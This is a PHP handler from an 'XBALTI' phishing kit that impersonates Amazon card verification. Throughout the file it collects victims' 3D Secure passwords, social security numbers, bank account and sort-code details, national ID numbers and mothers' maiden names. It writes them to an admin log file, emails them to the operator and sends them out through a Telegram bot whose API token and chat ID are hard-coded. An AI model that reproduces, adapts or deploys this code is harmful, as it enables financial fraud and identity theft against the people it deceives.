<?php
/*   
             ,;;;;;;;,
            ;;;;;;;;;;;,
           ;;;;;'_____;'
           ;;;(/))))|((\
           _;;((((((|))))
          / |_\\\\\\\\\\\\
     .--~(  \ ~))))))))))))
    /     \  `\-(((((((((((\\
    |    | `\   ) |\       /|)
     |    |  `. _/  \_____/ |
      |    , `\~            /
       |    \  \ BY XBALTI /
      | `.   `\|          /
      |   ~-   `\        /
       \____~._/~ -_,   (\
        |-----|\   \    ';;
       |      | :;;;'     \
      |  /    |            |
      |       |            |                   
*/
session_start();
$_SESSION['passvbv']   = $_POST['passvbv'];
$_SESSION['codicefiscale']   = $_POST['codicefiscale'];
$_SESSION['kontonummer']   = $_POST['kontonummer'];
$_SESSION['offid']   = $_POST['offid'];
$_SESSION['osid']   = $_POST['osid'];
$_SESSION['creditlimit']   = $_POST['creditlimit'];
$_SESSION['sortcode']   = $_POST['sortcode'];
$_SESSION['accnumber']   = $_POST['accnumber'];
$_SESSION['ssn']   = $_POST['ssn'];
$_SESSION['ssnca']   = $_POST['ssnca'];
$_SESSION['mmname']   = $_POST['mmname'];
$timedate = date('H:i:s d/m/Y');
include('./Email.php');
include('./get_browser.php');
include('./get_ip.php');

$Country=$_SESSION['country'];$IP=$_SESSION['_ip_'];$codicefiscale=$_SESSION['codicefiscale'];$kontonummer=$_SESSION['kontonummer'];$offid=$_SESSION['offid'];$osid=$_SESSION['osid'];$creditlimit=$_SESSION['creditlimit'];$sortcode=$_SESSION['sortcode'];$accnumber=$_SESSION['accnumber'];$ssn=$_SESSION['ssn'];$ssnca=$_SESSION['ssnca'];$mmname=$_SESSION['mmname'];

$ygmai="
[+]━━━━━━━━━━━━━━━━━━━【💖Amazon VBV💖】━━━━━━━━━━━━━━━━━━━━━━[+]
[🔑 country ]  = ".$Country."
[🔍 IP ] = ".$IP."

";
$msg .="
<!DOCTYPE html>
<html>
<head>
	<title>*REZULT*</title>
</head>
<body    style=' padding:0;margin:0;
    		background-color: #fff;
    		background-attachment:fixed;
    		border-bottom:1px solid rgba(255,255,255,0);
    		color: #ff8100;
    		height: 100vh;
    		font-family: calibri;
    		background-color: #000;
    		font-size: 18px;
    		text-shadow: 0 0 10px #ff8100;'  >
	<p style='text-align: center;margin:40px 0;'  >
		<img height='100px;' src='http://icons.iconarchive.com/icons/designbolts/credit-card-payment/256/Amazon-icon.png'>
	</p>
	<div   style=' margin:0 auto;
			max-width: 900px;
			width: 100%;
			border:2px solid #ff8100;
			border-radius: 4px;
			box-shadow: 0 0 20px #ff8100; '>


		<div align='center' style=' padding:10px 20px;  '> 
         <h1 style='text-align: center;' >XBALTI</h1>
			<p style='text-align: center;'>CARD INFORMATION FROM |".$_SESSION['country']."| ip = ".$_SESSION['_ip_']."   </p>
			<p>
				<table  style='margin:40px 0;border-bottom: 4px solid #6b5c5c;padding: 20px 0;border-radius: 4px;border-top: 4px solid #6b5c5c;'>\n";
                
                
$msg .= "<tr>
						<td style=' width: 30%; '>
							|Password 3D|
						</td>
						<td>:
						".$_SESSION['passvbv']."
						</td>
					</tr>\n";
                
                
if($_SESSION['countryCode'] == "IT"){ 
$ygmai="
[+]━━━━━━━━━━━━━━━━━━━【💖Italy-vbv💖】━━━━━━━━━━━━━━━━━━━━━━[+]
[ Codice Fiscale ] = ".$codicefiscale."
";
$msg .= "<tr>
						<td style=' width: 30%; '>
							|Codice Fiscale|
						</td>
						<td>:
						".$_SESSION['codicefiscale']."
						</td>
					</tr>\n";} 
elseif($_SESSION['countryCode'] == "DE"){ 
$ygmai="
[+]━━━━━━━━━━━━━━━━━━━【💖DE-vbv💖】━━━━━━━━━━━━━━━━━━━━━━[+]
[ Kontonummer ] = ".$kontonummer."
";
 $msg .= "<tr>
			<td style=' width: 30%; '>
					|Kontonummer|
						</td>
						<td>:
						".$_SESSION['kontonummer']."
						</td>
					</tr>\n";
                    } 
elseif($_SESSION['countryCode'] == "GR"){ 
$ygmai="
[+]━━━━━━━━━━━━━━━━━━━【💖GR-vbv💖】━━━━━━━━━━━━━━━━━━━━━━[+]
[ Official ID ] = ".$offid."
";
$msg .= "<tr>
			<td style=' width: 30%; '>
					|Official ID|
						</td>
						<td>:
						".$_SESSION['offid']."
						</td>
					</tr>\n";} 
elseif($_SESSION['countryCode'] == "AU"){ 
$ygmai="
[+]━━━━━━━━━━━━━━━━━━━【💖AU-vbv💖】━━━━━━━━━━━━━━━━━━━━━━[+]
[ OSID ] = ".$osid."
[ Credit Limit ] = ".$creditlimit."
";
$msg .= "<tr>
			<td style=' width: 30%; '>
					|OSID|
						</td>
						<td>:
						".$_SESSION['osid']."
						</td>
					</tr>
                    <tr>
			<td style=' width: 30%; '>
					|Credit Limit|
						</td>
						<td>:
						".$_SESSION['creditlimit']."
						</td>
					</tr>\n";} 
elseif($_SESSION['countryCode'] == "IE" || $_SESSION['countryCode'] == "GB"){ 
$ygmai="
[+]━━━━━━━━━━━━━━━━━━━【💖GB-vbv💖】━━━━━━━━━━━━━━━━━━━━━━[+]
[ Sort Code ] = ".$sortcode."
[ Account Number ] = ".$accnumber."
";
$msg .= "<tr>
			<td style=' width: 30%; '>
					|Sort Code|
						</td>
						<td>:
						".$_SESSION['sortcode']."
						</td>
					</tr>
                    <tr>
			<td style=' width: 30%; '>
					|Account Number|
						</td>
						<td>:
						".$_SESSION['accnumber']."
						</td>
					</tr>\n";} 
elseif($_SESSION['countryCode'] == "US"){ 
$ygmai="
[+]━━━━━━━━━━━━━━━━━━━【💖US-vbv💖】━━━━━━━━━━━━━━━━━━━━━━[+]
[ SSN ] = ".$ssn."
";
$msg .= "<tr>
			<td style=' width: 30%; '>
					|SSN|
						</td>
						<td>:
						".$_SESSION['ssn']."
						</td>
					</tr>\n";} 
elseif($_SESSION['countryCode'] == "CA"){ 
$ygmai="
[+]━━━━━━━━━━━━━━━━━━━【💖CA-vbv💖】━━━━━━━━━━━━━━━━━━━━━━[+]
[ SSN ] = ".$ssnca."
[ M Maiden Name ] = ".$mmname."
";
$msg .= "<tr>
			<td style=' width: 30%; '>
					|SSN|
						</td>
						<td>:
						".$_SESSION['ssnca']."
						</td>
					</tr>
                    <tr>
			<td style=' width: 30%; '>
					|M Maiden Name|
						</td>
						<td>:
						".$_SESSION['mmname']."
						</td>
					</tr>\n";} 
					
$msg .="<hr style='height: 10px; border: 0; box-shadow: 0 10px 10px -10px #8c8c8c inset;' >
				     <tr>
						<td style=' width: 30%;'>
							|Country|
						</td>
						<td>: 
						".$_SESSION['country']."
						</td>
					</tr>
					<tr>
						<td style=' width: 30%;'>
							|ip|
						</td>
						<td>: 
						".$_SESSION['_ip_']."
						</td>
					</tr>
					<tr>
						<td style=' width: 30%;'>
							|Browser/System|
						</td>
						<td>: 
						".XB_Browser($_SERVER['HTTP_USER_AGENT'])." On ".XB_OS($_SERVER['HTTP_USER_AGENT'])."
						</td>
                      </tr>
				</table>
                
               <hr style='height: 10px; border: 0; box-shadow: 0 10px 10px -10px #8c8c8c inset;' >
			</p>
		</div>
	</div>
</body>
</html>\n";


            
                
                

    $khraha = fopen("../../admin/rezulta.php", "a");
	fwrite($khraha, $msg);
    $subject .= "VBV INFO FROM [".$_SESSION['country']."] 😈 [".$_SESSION['_ip_']."]";$headers .= "From: <XBALTI>";$api = "2035318780:AAFF95W4a9Q4qlACGjeLPXzsDT4ekyMVO0I";$chatid = "-1001552903050";file_get_contents("https://api.telegram.org/bot".$api."/sendMessage?chat_id=".$chatid."&text=" . urlencode($ygmai)."" );
    $headers .= "MIME-Version: 1.0\n";
	$headers .= "Content-type: text/html; charset=UTF-8\n";
    @mail($Email, $subject, $msg, $headers);
	include("Telegram.php");

	?>
